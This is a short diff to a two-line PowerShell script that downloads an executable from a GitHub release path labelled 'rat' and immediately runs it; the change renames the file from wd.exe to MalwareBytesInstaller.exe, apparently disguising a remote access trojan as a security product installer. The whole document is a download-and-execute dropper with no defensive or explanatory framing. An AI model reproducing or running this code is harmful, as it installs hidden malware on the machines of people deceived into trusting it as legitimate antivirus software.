@@ -1,2 +1,2 @@
-(New-Object System.Net.WebClient).DownloadFile('https://github.com/epiclyrizzy/flippy/releases/download/rat/wd.exe', "$env:USERPROFILE\Downloads\file.exe")
-Start-Process "$env:USERPROFILE\Downloads\file.exe"
+(New-Object System.Net.WebClient).DownloadFile('https://github.com/epiclyrizzy/flippy/releases/download/rat/MalwareBytesInstaller.exe', "$env:USERPROFILE\Downloads\MalwareBytesInstaller.exe")
+Start-Process "$env:USERPROFILE\Downloads\MalwareBytesInstaller.exe"
